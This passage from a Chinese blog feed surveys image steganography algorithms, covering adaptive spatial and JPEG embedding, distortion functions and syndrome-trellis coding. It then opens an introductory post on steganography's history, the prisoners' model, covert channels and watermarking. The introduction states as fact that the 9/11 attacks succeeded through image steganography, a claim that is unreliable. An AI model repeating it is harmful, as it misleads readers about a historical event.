Hide&amp;Seek隐写算法缺陷的方法。该算法主要有两个步骤：1）嵌入过程：不修改值为0,1的DCT系数，通过伪随机数生成器生成下一步嵌入的位置（即，跳转的间隔）；2）纠正过程：利用未被修改的DCT系数来保证DCT系数的统计直方图保持跟嵌入秘密信息前的直方图相似，以消除值对现象。所以该方法既保持了DCT系数一阶统计特性，也保持了直方图的统计特性。后面Sallee又提出基于模型的隐写方法（Model Based）MB1隐写算法[12]及其改进算法MB2隐写算法[13]。MB1算法利用DCT系数出现的概率通过Cauchy分布对其进行拟合、算术重编码，以保持直方图统计特性；MB2算法在MB1的基础上对非零系数的隐写作了进一步限制——只能嵌入少于一半非零系数的秘密二进制信息，此外还对没有嵌入秘密信息的DCT非零系数做了微调，提高了统计特性的稳定性，增强了隐写算法的安全性。</p><h2 id="x30-基于数字图像自适应隐写算法">0x30 基于数字图像自适应隐写算法</h2><p>数字图像自适应隐写是近十年来众多学者较为关注的一个方向，因为它相较于传统算法具有较强的安全性、鲁棒性。自适应隐写根据载体图像的纹理和待隐藏的信息，根据载体图像的纹理复杂度自适应地调节嵌入的数据量。大部分自适应算法都是基于“嵌入失真+隐写编码”架构实现图像的自适应隐写。目前有多种隐写编码技术，如：湿纸编码[14]、ZZW编码[15],[16],[17]和矩阵编码[18]等，但是目前较为广泛的还是STC编码[19]，其可以通过最小化嵌入失真算法让性能无限接近于最优解，当然也有这些编码的融合方法，如基于湿纸码和STC码的高效隐写算法[20]。自适应隐写算法充分考虑了Stego（载体）的图像纹理特性，通过分析Stego的特点，将秘密信息有选择地嵌入到纹理较为复杂、边缘较为明显的图像区域中。这样做的好处在于：既能保持载体图像外在呈现出来的图像信息，保留视觉上的完整性，又降低了专用隐写分析算法的分析准确率，具有较强的抗分析能力。自适应隐写发展经历了不同的时期，不同的时期有不同的代表算法。</p><h3 id="x31-数字图像自适应隐写基本概念">0x31 数字图像自适应隐写基本概念</h3><p>在典型的“嵌入失真+隐写编码”架构中，嵌入失真函数基于最小加性失真的方法，研究者主要研究的有两个方向分别是：失真函数的设计和最小化嵌入失真的实现。如前面所说，自适应隐写的最终目的是让隐秘信息根据载体图像的纹理特征自动调整嵌入信息的强度，使嵌入的秘密信息极力地伪装成载体图像的噪声，让隐写分析攻击者难以分析，防止秘密信息在传输过程中被截获、分析、破坏，提高图像隐写的安全性。为了达到这一目的，就需要从三个维度——“加性失真函数+最小嵌入失真+隐写编码算法”来考虑：加性失真函数能够自适应地在载体图像中根据载体图像的纹理特性寻找最合适的像素点；最小嵌入失真方法能够考量如何想载体图像嵌入秘密信息的过程中使载体图像特性的变化最小化；而隐写编码算法则根据最小失真方法改变的参数来调整嵌入的效率和速率。为了进一步提高隐写编码算法的效率，还出现了多种隐写编码算法的融合方法，如：融合湿纸码和STC码的隐写算法[20]。下面会介绍以上三个维度每种最基础的方法，以便后续理解和分析各种自适应隐写算法。</p><ol type="1"><li><p>加性失真函数 研究表明，载体图像的统计特性的变化与载体图像的纹理特征具有很强的相关性，这种强相关表现在：载体图像的纹理特征越复杂，其嵌入秘密信息后的改变程度越小。而加性失真函数就是评估秘密信息嵌入载体图像后其统计特性改变程度的一种方法，换而言之，失真函数能够反映图像纹理的复杂度，通过失真函数，能够为后期最小嵌入失真提供数据支撑。我们定义两张图片分别为载体图像ℂ和载密图像𝕊，其大小均为 ，载体图像ℂ和载密图像𝕊的像素点取整范围分别为： <span class="math display">\[\begin{split}C_{i,j}\in0,1,2,\ldots,253,254,255 \\S_{i,j}\in0,1,2,\ldots,253,254,255 \\\end{split}  \tag{1}\]</span> 我们定义<span class="math inline">\(\beta_{i, j}\)</span>为载体图像ℂ在<span class="math inline">\((i, j)\)</span>位置的像素<span class="math inline">\(C_{i, j}\)</span>改变为载密图像𝕊位置<span class="math inline">\((i, j)\)</span>的像素<span class="math inline">\(S_{i, j}\)</span>产生的失真参数[21]，则载体图像ℂ整体嵌入失真函数<span class="math inline">\(\Delta(\mathbb{C}, \mathbb{S})\)</span>为： <span class="math display">\[\Delta(\mathbb{C}, \mathbb{S})=\sum_{i=1}^{m} \sum_{j=1}^{n} \beta_{i j}\left|C_{i j}-S_{i, j}\right|, \quad\left(0 \leq \rho_{i, j} \leq \infty\right)\tag{2}\]</span> 由上述公式可知，嵌入失真函数跟载体图像密切相关。具体来讲，<span class="math inline">\(\left|C_{i, j}-S_{i, j}\right|\)</span>差值越大，即载体图像改变程度越大，则整体的失真度越高。当然，为了便于理解，这只是一个简单的模型，真正的隐写模型使用到的失真函数比这个更为复杂。</p></li><li><p>最小嵌入失真 我们已经通过上述步骤求得嵌入失真函数，接下来就需要考虑怎么把嵌入失真最小化，以最小化嵌入秘密信息带来的对载体信息统计特性的影响，最小化嵌入失真就由此提出。显然，最小化嵌入失真是一个求极值的问题，也就是求最小值的问题，求解这样的问题最有效的方法是求导找斜率，最小嵌入失真函数便基于此思想建立。设<span class="math inline">\(\pi(\mathrm{i}, j)\)</span>为载体图像ℂ在位置<span class="math inline">\((i, j)\)</span>的像素<span class="math inline">\(C_{i, j}\)</span>改变为载密图像𝕊位置<span class="math inline">\((i, j)\)</span>像素<span class="math inline">\(S_{i, j}\)</span>的概率，<span class="math inline">\(m\)</span>为嵌入的秘密信息的二进制长度。为了求出公式<span class="math inline">\(2\)</span>中的最优解（即最小值），我们对其取极值得： <span class="math display">\[\pi\left(S_{\mathrm{i}, \mathrm{j}}\right)=\frac{\mathrm{e}^{-\lambda \rho_{i, j}}}{\sum_{S \in \tau_{\mathrm{ij}}} \mathrm{e}^{-\lambda \rho_{i, j}}}\tag{3}\]</span> 则秘密信息长度<span class="math inline">\(m\)</span>为： <span class="math display">\[m=\sum_{i=1}^{m} \sum_{j=1}^{n} \sum_{S \in \tau_{i, j}} \pi\left(S_{i, j}\right) \log \frac{1}{\pi\left(S_{i, j}\right)}\tag{4}\]</span> 由公式<span class="math inline">\(4\)</span>可得在最小嵌入失真的前提下，可嵌入的秘密信息的长度。这一重要结论在于分离了图像模型<span class="math inline">\(\pi\left(S_{\mathrm{i}, \mathrm{j}}\right)\)</span>和实际计算中使用到的编码算法，因此，我们可以设计出更好的编码或使用更好的图像模型使最终隐写算法的性能、安全性、抗分析能力最优。需要注意的是，最小化嵌入失真的过程还有一个重要的步骤，就是隐写编码，隐藏信息就是通过隐写编码嵌入到载体图像中。</p></li><li><p>隐写编码算法 经过上述步骤，在已知失真函数的情况下，隐写编码算法可以动态调整失真函数，使嵌入秘密信息后载密图像的统计特征无限接近于原始图像（载体图像）。其中，Filler提出的STC（Syndrome-Trellis Codes）是一种二元隐写编码[19]，STC编码奠定了隐写编码算法的研究基础，很多研究者在此基础上改进或融合了STC编码。此外，早期湿纸编码[22]也非常流行。</p></li></ol><h3 id="x32-基于视觉效果的隐写算法">0x32 基于视觉效果的隐写算法</h3><p>在早期自适应隐写方向，隐写研究者最开始想到的是在载体图像纹理丰富的区域嵌入隐秘信息，因其纹理复杂，会被观察者误认为是噪点而忽略掉，难以观察出来，具有较强的隐蔽性。基于这个出发点，Kawaguchi E.等人提出了基于位平面的复杂段分割隐写算法（Bit-Plane Complexity Segmentation，BPCS）[23]，该算法提出：将载体图像的位面和待隐藏信息分割成大小相同的位面块，随后将载体图像的低复杂度位面小块与待隐藏的信息替换以隐藏信息。这种算法简单高效，却容易被分析。基于BPCS算法，Da-Chun Wu等人提出了改进的基于像素插值的视觉隐蔽算法PVD（Pixel Value Difference）[24]，该算法将载体图像分割大小相同的互不重叠的像素方块，根据分割出来的像素块之间的差值来确定嵌入的隐秘信息的多少，如果像素块之间的差值越大，说明纹理越复杂，视觉干扰越明显，则可以嵌入越多的隐秘信息。BPCS和PVD算法都是基于视觉效果进行信息隐藏的算法，具有良好的视觉隐蔽性，但是在抗隐写分析算法的性能上却非常低效。学者为了提高自适应算法的抗分析能力，尝试了多种方法，如今主流、有效的方法是基于最小化统计的隐写方法[25],[26],[27]和基于最小加性失真模型的隐写方法[28]。后者在学术界得到了更广泛的发展，并且衍生出大量高质的自适应隐写算法。</p><h3 id="x33-空域自适应隐写算法">0x33 空域自适应隐写算法</h3><p>为了避免基于视觉效果的信息隐藏算法中的安全性问题，研究者提出了在空间域实现隐写的方法，这些方法大都基于“嵌入失真函数+STC编码技术”架构[29]实现空域隐写，文献[29]首次提出基于该架构的空域自适应隐写算法——（Highly Undetectable setGO）HUGO算法，将自适应隐写算法从基于视觉隐藏算法中的研究方向转移到基于空域图像隐写算法的方向中去，极大地提高了自适应隐写算法地安全性和抗分析能力。在载体图像的灰度共生矩阵提取特征时，HUGO算法将其提取像素地阈值设为T=90，因此载密图像在像素值为[80,93]区间的像素个数发生了明显变化，很容易被统计攻击，极大降低了自适应算法的安全性。为了解决这个问题，Jan Kodovsky等人提出将HUGO算法的阈值设为T=255[30]，即为HUGO255。为了进一步提高类HUGO算法在高嵌入率情况下的安全性，Fridrich在文献[25]中提出MG（Multivariate Gaussian）算法，该算法利用不同分布但相互独立的量化多元高斯模型对载体图像进行建模，通过载体对象（Cover）和载密对象（Stego）最小化KL散度（Kullback Leibler），以生成嵌入失真函数，此外还利用拉格朗日乘子法推导出给定载荷和图像的最优嵌入变化概率。相较于HUGO隐写算法，MG隐写算法对于大于0.3bpp的有效载荷具有更强的安全性；但对于较小的有效载荷，HUGO相对安全一点。文献[31]提出在空间域定义加性隐写失真的WOW方法，该方法在改变一个像素之后，对方向高通滤波器输出的变化加权，随后用Holder范数的倒数聚合，来定义单个像素的成本。</p><p>HUGO、MG、WOW隐写算法利用最优搜索保持载密图像与载体图像高阶的统计特性，因此提高了抗统计分析的能力，安全性高于一般的隐写算法。Vojtěch Holub等人为了进一步改进WOW算法，提出了一种测量固定于中的嵌入失真的新方法，该方法独立于嵌入变化（和编码）所在的域，通过Daubechies小波滤波器组获得的方向残差来评估图像元素（如：像素或DCT系数）的改变值。简单来说，就是将嵌入更改限制在那些难以在多个方向建模的区域，同时避免对光滑区域和平滑的边缘进行隐写，由此衍生成（UNIversal WAvelet Relative Distortion，UNIWARD）通用小波相对失真系列的隐写算法。此外，基于空域的自适应隐写算法还有SUNIWARD（Spatial UNIWARD）隐写算法、HILL（HIgh-pass, Low-pass, and Low-pass）隐写算法[32]、MiPOD（Minimizing the Power of Optimal Detector）隐写算法[27]等。这些算法的核心思想是：基于复杂度优先的原则对元素进行更改，简而言之，载体图像区域嵌入的失真小，则被嵌入隐秘信息的概率大，反之，被嵌入隐秘信息的概率小。基于这一思想Li Bin等人提出cost-value分布的思想，结合了扩散原则（Spreading Rule）和聚合原则（Clustering Rule）进一步优化选取图片元素的策略。</p><p>值得注意的是，上述算法的嵌入失真都是加性的嵌入失真，而文献[33]提出了一个通过定义联合失真像素块、基于非加性失真隐写的框架。为了降低最小化联合失真函数的复杂度，该文献提出Dejoin（Decomposing Joint distortion）隐写算法[33]，该方法证明了非加性失真嵌入函数在隐写中的可行性。</p><h3 id="x34-jpeg域自适应隐写算法">0x34 JPEG域自适应隐写算法</h3><p>Fridrich等人最早在2005年提出一种新的JPEG自适应隐写算法——扰动量化算法[34]。该算法使用量化取整误差的方法来构造嵌入失真函数，该方法使用湿纸编码，在DCT系数取整时，干扰其取整方向以嵌入秘密信息。基于[18]和[34]两种算法，出现了MMe（Modified Matrix Encoding）和PQ（Perturbed Quantization）隐写算法，这两种算法是早期的JPEG自适应隐写算法的代表，其核心架构是“嵌入失真函数+隐写编码算法”。为了进一步改进PQ算法，文献[10]提出了PQe（PQ energy-adaptive）和PQt（PQ texture-adaptive） 隐写算法，这两种算法既融合DCT系数量化取整误差的思想，又考虑了DCT系数各个分块的能量大小和纹理复杂度，明显提升了PQ算法的性能。为了进一步提高JPEG隐写的安全性，Huang F.等人提出NPQ（Normalized PQ）隐写算法[35]，该算法提出了新的信道选择规则，该规则可用于寻找最小的可检测失真的DCT系数。类似于SUNIWARD空域自适应隐写算法，文献[36]提出适用于变换域的JPEG图像隐写算法和Slide Informed UNIWARD（SIUNIWARD）隐写算法。为了让隐写算法可以抗空域和变换域隐写分析的能力，Wang Z.等人提出Hybrid隐写算法，该算法基于DCT系数量化步长和像素块差值，嵌入效率明显高于JUNIWARD隐写算法。此外，还有早期的EBS（Entryopy Block Steganography）隐写算法[37]，能够抵抗高维检测攻击；UED（Uniform Embedding  Distortion）系列算法——UED-SC （UED based on Single Coefficient）、UED-JC（UED based on Joint Coefficients）、SI-UED（Side Informed UED）[38],[39]，基于载体图像DCT系数块内、块间相邻系数生成相应的嵌入失真函数，具有较强的抗检测性优势。</p><h2 id="x40-总结">0x40 总结</h2><p>本章介绍空域隐写算法时，从最简单的LSB隐写原理开始介绍，之后再详细列举了LSB隐写的变种及随即调制、有限调色板隐写等方法；介绍变换域隐写算法时，先从JPEG压缩的原理出发，介绍了其流程，然后解释基于DCT的多种变换域隐写的方法；介绍自适应隐写算法时，则先介绍了自适应隐写算法的基本概念及公式，然后基于这些概念展开阐述各种自适应隐写算法的核心思想。</p><h2 id="x50-参考文献">0x50 参考文献</h2><blockquote><p>[1] Zhang T, Ping X J. Reliable Detection of Spatial LSB Steganography Based on Difference Histogram[J]. Journal of Software, 2004, 15(1):151-158.</p><p>[2] Fridrich J , Goljan M , Du R . Detecting LSB steganography in color, and gray-scale images[J]. IEEE Multimedia, 2001, 8(4):22-28.</p><p>[3] Westfeld A, Pfitzmann A. Attacks on Steganographic Systems[C] International Workshop on Information Hiding. Springer-Verlag, 1999.</p><p>[4] Mielikainen, J. LSB matching revisited[J]. IEEE Signal Processing Letters, 2006, 13(5):285-287.</p><p>[5] Li X , Yang B , Cheng D , et al. A Generalization of LSB Matching[J]. IEEE Signal Processing Letters, 2009, 16(2):69-72.</p><p>[6] Fridrich J , Goljan M . Digital image steganography using stochastic modulation[J]. Proceedings of SPIE - The International Society for Optical Engineering, 2003, 5020(4):191--202.</p><p>[7] Marvel L M , Retter C T , Boncelet C G . Hiding Information in Images.[C]// International Conference on Image Processing. IEEE, 1998.</p><p>[8] Pennebaker W B , Mitchell J L . JPEG still image data compression standard[M]. Van Nostrand Reinhold, 1992.</p><p>[9] Westfeld A . F5—A Steganographic Algorithm[M]// Information Hiding. Springer Berlin Heidelberg, 2001.</p><p>[10] Fridrich J . Statistically undetectable jpeg steganography:dead ends challenges, and opportunities[C]// Workshop on Multimedia &amp; Security. DBLP, 2007.</p><p>[11] Provos N . Defending Against Statistical Steganalysis[C]// Conference on Usenix Security Symposium. USENIX Association, 2001.</p><p>[12] Sallee P . Model-Based Steganography[C]// International Workshop on Digital Watermarking. Springer, Berlin, Heidelberg, 2003.[13] Sallee P. MODEL-BASED METHODS FOR STEGANOGRAPHY AND STEGANALYSIS[J]. International Journal of Image and Graphics, 2005, 5(01):23.</p><p>[14] Fridrich J , Goljan M , Lisonek P , et al. Writing on wet paper[J]. IEEE Transactions on Signal Processing, 2005, 53(10):3923-3935.</p><p>[15] Zhang W , Wang S , Zhang X . Improving Embedding Efficiency of Covering Codes for Applications in Steganography[J]. IEEE Communications Letters, 2007, 11(8):680-682.</p><p>[16] Zhang W , Zhu X . Improving the Embedding Efficiency of Wet Paper Codes by Paper Folding[J]. IEEE Signal Processing Letters, 2009, 16(9):794-797.</p><p>[17] Zhang W , Wang X . Generalization of the ZZW Embedding Construction for Steganography[J]. IEEE Transactions on Information Forensics and Security, 2009, 4(3):564-569.</p><p>[18] Kim Y , Duric Z , Richards D . Modified Matrix Encoding Technique for Minimal Distortion Steganography[J]. 2006.</p><p>[19] T Filler ，J Judas ，J Fridrich. Minimizing Additive Distortion in Steganography Using Syndrome-Trellis Codes. IEEE Signal Processing Society, 2011.</p><p>[20] 刘华, 汤光明. 一种融合湿纸码和STC码的高效隐写算法[J]. 计算机应用研究, 2012, 29(6).</p><p>[21] Pevný, Tomáš, Filler, Tomáš, Bas P . Using High-Dimensional Image Models to Perform Highly Undetectable Steganography[J]. Lecture Notes in Computer Science, 2010, 6387:161-177.</p><p>[22] Fridrich J, Goljan, Soukal D. Wet paper codes with improved embedding efficiency[J]. IEEE Transactions on Information Forensics and Security, 2006, 1(1):102-110.</p><p>[23] Kawaguchi E, Eason R O. Principles and applications of BPCS steganography[C]// Photonics East. International Society for Optics and Photonics, 1999.</p><p>[24] Wu D C , Tsai W H . A steganographic method for images by pixel-value differencing[J]. Pattern Recognition Letters, 2003, 24(9-10):1613-1626.</p><p>[25] Fridrich J , Jan Kodovský. MULTIVARIATE GAUSSIAN MODEL FOR DESIGNING ADDITIVE DISTORTION FOR STEGANOGRAPHY[C]// IEEE International Conference on Acoustics. IEEE, 2013.</p><p>[26] Alattar A M , Memon N D , Heitzenrater C D , et al. SPIE Proceedings [SPIE IS&amp;T/SPIE Electronic Imaging - San Francisco, California, United States (Sunday 8 February 2015)] Media Watermarking, Security, and Forensics 2015 - Content-adaptive pentary steganography using the multivariate generalized Gaussian cover model[J]. 2015, 9409:94090H.</p><p>[27] Sedighi V , Cogranne R , Fridrich J . Content-Adaptive Steganography by Minimizing Statistical Detectability[J]. IEEE Transactions on Information Forensics and Security, 2015:1-1.</p><p>[28] Fridrich J , Filler T . Practical methods for minimizing embedding impact in steganography[C]// Electronic Imaging. International Society for Optics and Photonics, 2007.</p><p>[29] Pevný, Tomáš, Filler, Tomáš, Bas P . Using High-Dimensional Image Models to Perform Highly Undetectable Steganography[J]. Lecture Notes in Computer Science, 2010, 6387:161-177.</p><p>[30] Kodovsky J , Fridrich J , Holub V . On dangers of overtraining steganography to incomplete cover model[C]// Acm Multimedia &amp; Security Workshop. ACM, 2011.</p><p>[31] Holub V , Fridrich J J . Designing steganographic distortion using directional filters.[C]// IEEE International Workshop on Information Forensics &amp; Security. IEEE, 2012.</p><p>[32] Li B , Wang M , Huang J , et al. A new cost function for spatial image steganography[C]// 2014 IEEE International Conference on Image Processing (ICIP). IEEE, 2015.</p><p>[33] Zhang W , Zhang Z , Zhang L , et al. Decomposing Joint Distortion for Adaptive Steganography[J]. IEEE Transactions on Circuits and Systems for Video Technology, 2016:1-1.</p><p>[34] Fridrich J , Goljan M , Soukal D . Perturbed quantization steganography[J]. Multimedia Systems, 2005, 11(2):98-107.</p><p>[35] Huang F , Huang J , Shi Y Q . New Channel Selection Rule for JPEG Steganography[J]. IEEE Transactions on Information Forensics and Security, 2012, 7(4):1181---1191.</p><p>[36] Holub, Vojtěch, Fridrich J . [ACM Press the first ACM workshop - Montpellier, France (2013.06.17-2013.06.19)] Proceedings of the first ACM workshop on Information hiding and multimedia security - IH&amp;MMSec "13 - Digital image steganography using universal distortion[J]. 2013:59.</p><p>[37] Wang C , Ni J . An efficient JPEG steganographic scheme based on the block entropy of DCT coefficients[C]// IEEE International Conference on Acoustics. IEEE, 2012.</p><p>[38] Guo L , Ni J , Shi Y Q . An efficient JPEG steganographic scheme using uniform embedding[C]// Information Forensics and Security (WIFS), 2012 IEEE International Workshop on. IEEE, 2012.</p><p>[39] Guo L , Ni J , Shi Y Q . Uniform Embedding for Efficient JPEG Steganography[J]. IEEE Transactions on Information Forensics and Security, 2014, 9(5):814-825.</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;数字图像隐写算法根据不同的标准而有不同的分类。下面重要根据隐写算法的工作域和隐写算法的适用范围来展开数字图像隐写算法的介绍。&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://www.killshadow.xyz/tags/CTF/"/>
    
      <category term="MISC" scheme="http://www.killshadow.xyz/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>隐写术(一)--简介</title>
    <link href="http://www.killshadow.xyz/2019/05/29/%E9%9A%90%E5%86%99%E6%9C%AF(%E4%B8%80)--%E7%AE%80%E4%BB%8B/"/>
    <id>http://www.killshadow.xyz/2019/05/29/隐写术(一)--简介/</id>
    <published>2019-05-29T03:05:00.000Z</published>
    <updated>2019-05-29T04:57:00.672Z</updated>
    
    <content type="html"><![CDATA[<h2 id="x00-隐写术背景">0x00 隐写术背景</h2><blockquote><p>在信息时代的发展、计算机软硬件的升级、多媒体技术的发展的背景下，信息隐藏愈发朝气蓬勃，已经逐渐成为信息安全研究不可或缺的方向。数千年来，人们一直希望对某些敏感的信息进行保密传送，随即发展出信息加密技术和信息隐藏技术等。在今天这个数字媒体技术和互联网技术爆发的时代，人们这样的需求更加迫切，如何在通信中保证传输秘密信息的隐蔽性已成为研究者、企业、国家关注的课题。<a id="more"></a>隐写术已经在当今数字世界的多个领域有所利用，例如版权保护、信息追加、防篡改、信息追踪，依托这些领域的成功，隐写术得以蓬勃发展。与加密信息的密码学不同的是，信息隐藏是通过将数据隐藏在多媒体载体中，被称为“隐藏数据中的数据”[1]，它利用人类在感官上（如视觉、听觉）的不敏感性以及媒体载体的信息冗余来隐藏额外的信息，把需要传送的信息嵌入到这些载体中，但却保持原载体信息的相对完整性以达到以假乱真的效果。数字媒体（如视频、音频、图片、网页、文本文件）的多样性保证了信息隐写技术的复杂性与相对安全性，正是因为丰富的数字媒体，信息隐藏技术才可以有丰富的隐藏方式来保证隐藏的信息只能被合法的接受者通过特定的分析技术提取出来。</p></blockquote>信息隐藏的思想在很早的古希腊时代就有所体现。在那时，一位名叫Histaiaeus的古希腊人蓄意煽动反抗波斯国王的一场叛乱。由于需要传递秘密信息，他剃光了他的一个奴隶的头发，并在这个奴隶的头皮上刻下了叛变的信息，当这个奴隶的头发重新长满之后，再把他送出城外，到达另一种城池，由于他的头发已长满能覆盖掉头皮上刻下的信息，他躲过了重重的搜查，最终到达目的地。信息接收者再次剃光了这位奴隶的头，看到了起兵造反的信息。在第二次世界大战期间，德军将信息隐藏在普通照片中，这些照片经过“细微化”处理，也就是将秘密信息写在用肉眼难以察觉的照片中，间谍需要用放大镜读取，间谍通过这技术从敌国将数据传递给友军（如下图）。20世纪80年代，玛格丽特·撒切尔（Margaret Thatcher）为了追查内阁的文件是如何泄露给媒体的，让文本编辑程序处理文本时添加一些空格，以便追踪泄密的内阁成员。同样在中国古代周朝的兵书《六韬》就有《阴符》与《阴书》两篇，大概意思是以一种象征符号形象传递密文给友军；宋朝兵书的《武经总要》里，又对《阴符》略作了改进。<div style="text-align: center;"><figure><img src="/2019/05/29/隐写术(一)--简介/8343187-f28189616cb2ce0f.png" alt="红色圆圈内用德语写了信息"><figcaption>红色圆圈内用德语写了信息</figcaption></figure></div><pre><code>隐写术和数字水印世多媒体安全两个重要的分支。前者主要是对信息进行隐藏以达到“漫天过海”的效果；后者主要是为了保证数字媒体的版权、用途，确保使用者是合法使用数字媒体。随着数字媒体的逐渐增多，数字隐写已逐渐成为隐写术的主流技术，隐写分析作为数字隐写的逆向工程，其研究内容也在随着数字隐写的发展而发展，从上世纪九十年代的隐写变革以来，已有数不胜数的分析方法，而隐写分析的主要目的是将隐写后的载体提取、分析甚至破坏其隐藏的内容。这两种技术犹如蓝军与红军一攻一防相辅相成，共同发展才得以保持平衡关系。但是在这个过程中有相当多的问题：随着人工智能时代的到来，如何提高隐写分析的效率和质量而花费较少的资源和时间成为研究者关注的重心。</code></pre><p>随着数字隐写技术的普及与发张，该技术除了被一些企业、政府、军队使用，还被一些地方武装分子、恐怖组织、极端势力利用数字隐写技术传送反动信息，以完成恐怖活动。如：2001年，著名的“911”事件的起因就是恐怖分子通过数字图像隐写技术而逃过美国情报机构的监控，最终被成功利用；2015年，Stegoloader病毒使用数字图片隐写技术入侵了全球的一些计算机系统，这款病毒使用隐写术躲避杀毒软件，成功入侵计算机，据报道其主要攻击目标是美国医疗保障公司。就在今年，即2019年，中国的一家安全企业发现一些图片携带恶意代码的有效负载，以达到攻击特定目标的目的。尽管信息安全攻防领域种，隐写术是一种低频的攻击途径，但一旦被网络犯罪分子、恐怖组织利用，代价是巨大的。因此，研究隐写分析技术在当前这个信息爆炸的时代迫在眉睫，对维护国家安全、社会稳定、企业健康发展具有重要作用。</p><p>从隐写分析算法出现的时间来分类，目前主要有传统的隐写分析算法和基于深度学习的分析算法。对于传统隐写分析方法，则主要以空域和JPEG域为数据隐藏的载体，此外还有一些自适应的隐写及隐写分析方法。目前对于LSBM的检测方法有基于直方图平滑效应的检测方法、基于自然图像邻域相关性的检测方法；针对JPEG域的盲检测算法主要是通过提取DCT系数分布特征和Markov特征来检测；针对盲检测算法，在提取特征这个方向上也有多种方法，思路一般是往高维提取统计特征。虽然目前基于深度学习的分析算法愈来愈热门，但是由于其训练耗时、模型正确性验证复杂且麻烦（很多时候无法通过理论推断模型成熟与否）一直深深困扰研究者。因此，本论文基于传统的隐写分析算法，将多种传统算法提取的特征融合，作为深度学习隐写分析分类器的输入，以提高效率与识别的准确性。</p><h2 id="x10-信息隐藏基本原理及研究方法">0x10 信息隐藏基本原理及研究方法</h2><h3 id="x11-隐写术基本模型">0x11 隐写术基本模型</h3><p>隐写术是一门隐藏信息的艺术和科学，可以使信息无法被发现。有一个著名的模型阐述了隐写术中各方的角色，这就是经典的Simmons模型——囚徒问题：假设Alice和Bob是监狱中的两个囚犯，他们之间的通信需要通过监狱警官Wendy来传达，同时Wendy能看到他们通信的内容，Alice和Bob要如何通信才能保证他们想要传达的秘密信息不被Wendy所检测察觉出来呢？如下图：</p><div style="text-align: center;"><img src="/2019/05/29/隐写术(一)--简介/8343187-0638d974a140b5b0.png" title="fig:" alt="Simmons模型"></div>我们不妨用更细致的角度来讨论这个问题，如下图：<div style="text-align: center;"><img src="/2019/05/29/隐写术(一)--简介/8343187-0e4e57eadff86216.png" title="fig:" alt="细化的囚徒模型"></div><p>Alice需要传送秘密信息m给Bob，但是她只能通过公开的载体对象C（即信纸），而且这个载体对象对第三方而言是完全透明的、可检测的。这时候她需要跟Bob商议好秘密信息嵌入的算法，然后通过嵌入算法把秘密信息m卡嵌入到载体对象C中，最终生成私密对象S，我们可以把它想象成是写满文字的信件，需要通过Wendy这个狱监传递这封信件，但同时Wendy也会检查信件，看有没有什么违法的信息。只要嵌入算法做的足够安全，或者Wendy检查过于粗糙，其中的秘密信息m就不会被他察觉出来。甚至他还可以改动这封信件，使之成为私密对象S’ （被鉴定后的信纸）。最终Bob收到这封信件后，他会用提取算法提取私密对象S’（被鉴定后的信纸）的秘密信息m’，这是Bob就能真正看到Alice真正想对Bob说的信息了。如果Bob能接收到Alice想要表达的信息，则说明越狱成功；否则，如果被监狱长Wendy发现，则越狱失败。</p>虽然信息隐藏技术的历史悠久，但是近几十年是该技术发展的黄金时期。伴随着计算机技术、多媒体技术的蓬勃发展，信息隐藏技术的发展异彩纷呈。准确来说，信息隐藏学科是一门交叉学科，又有多个分支领域，如图：<div style="text-align: center;"><img src="/2019/05/29/隐写术(一)--简介/8343187-a14619039e8c39f1.png" title="fig:" alt="信息隐藏技术的分支领域"></div><strong>隐蔽信道（Covert channel）</strong>：在合法信道中被用来传输隐蔽信息的信道称为隐蔽信道，这种隐蔽信道具有非常强的保密性。用Simmonns的囚徒模型解释就是：Alice和Bob通过信纸传输信息，信纸上呈现出来的信息就是合法信道，但是由于Alice和Bob在信纸上通过其他手段把他们想要逃狱的意图隐藏在信息中，通过看不见的“通道”把信息传递给对方，这样的信道就是隐蔽信道。随着互联网的发展，隐蔽信道随着Internet网络协议的变化而发展（如TCP/IP/IPv6等）。按隐藏信息的载体划分，隐蔽信道又可分为两种类型的信道，分别为：存储式隐蔽信道、时间式隐蔽信道。存储式隐蔽信道通过修改网络中的数据包来实现数据隐藏，可应用于TCP/IP的各个层次中；时间式隐蔽信道是通过修改数据包的数据流形式进行数据隐藏，如：修改数据包的顺序、数据包相隔的时间等方式来形成隐蔽信道。按发送对象的意图划分，隐蔽信道分为主动式隐蔽信道、被动式隐蔽信道。发送对象既控制公开信道中信息传输，又控制隐藏信道信息传输，则为主动式隐蔽信道；如果发送对象只负责隐蔽信道的信息传输，将隐蔽信道嵌入到别的公开信道，叫做被动式隐蔽信道。如图：<div style="text-align: center;"><img src="/2019/05/29/隐写术(一)--简介/8343187-8ad7536104d159ad.png" title="fig:" alt="隐蔽信道模型"></div><strong>隐写术（Steganograph）</strong>：通过嵌入秘密信息到载体当中的一种技术。隐写信息可以先用传统方法加密，然后再通过特定算法修改载体对象（Cover），加密后的对象叫载密对象（Stego）。其实现原理为：利用载体信息在空间、时间、存储的多余内容（即信息冗余），将秘密信息嵌入到载体生成载密信息，以实现秘密信息的传输。隐写术基本模型：<div style="text-align: center;"><img src="/2019/05/29/隐写术(一)--简介/8343187-0e3fc579b6bcf8c1.png" title="fig:" alt="隐写术基本模型"></div><p><strong>匿名（Anonymity）</strong>：实现匿名通信，就是用现有的技术对通信中的主体进行隐藏保护，通信主体即为发送者和接受者。主要使用匿名重发技术和网络代理技术实现匿名通信[2]。Syverson提出的洋葱路由就是通过路由转发，让中间参与者互不认知对方实现匿名。</p>数字水印（Digital watermarking）：在多媒体信息时代，许多数字媒体需要加以保护，以保障创作者的合法权宜，数字水印技术应运而生。这种技术能够将发行的版权信息或其他表明创作者合法权益的信息嵌入到数字媒体当中，以保护数字媒体合法版权。除此之外，数字水印还需保证数字媒体的完整性和可靠性。数字水印有两个较为重要的分类分别叫做脆弱水印与鲁棒水印，这两种水印分别对应数字媒体的两种特性分别叫脆弱性与鲁棒性。其中，脆弱数字水印是指经过分发、传输、使用后，数字水印能够精准判断数字媒体是否被篡改，甚至可以判断数据篡改的位置、程度以恢复原始信息，简单讲就是脆弱性越高数字媒体细微的变化就越容易察觉，主要用来标志数字作品的版权；鲁棒数字水印是指数字媒体没修改、处理之后还能保持相对地完整，并且能被准确识别，即鲁棒性越高数字媒体保持初始状态的稳定性越高，主要用来完整性保护和认证。<div style="text-align: center;"><img src="/2019/05/29/隐写术(一)--简介/8343187-fe6b005b013eed76.png" title="fig:" alt="数字水印信号嵌入模型"></div><div style="text-align: center;"><img 